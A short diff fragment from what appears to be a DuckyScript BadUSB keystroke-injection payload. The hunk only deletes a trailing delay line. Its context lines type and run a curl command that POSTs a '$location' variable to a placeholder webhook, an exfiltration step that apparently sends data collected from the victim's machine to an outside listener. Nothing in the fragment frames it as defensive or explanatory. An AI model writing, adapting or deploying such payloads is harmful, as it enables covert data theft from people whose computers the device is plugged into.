@@ -17,4 +17,3 @@ ENTER
 DELAY 1000
 STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=$location" https://yourwebhook
 ENTER
-DELAY 30000  
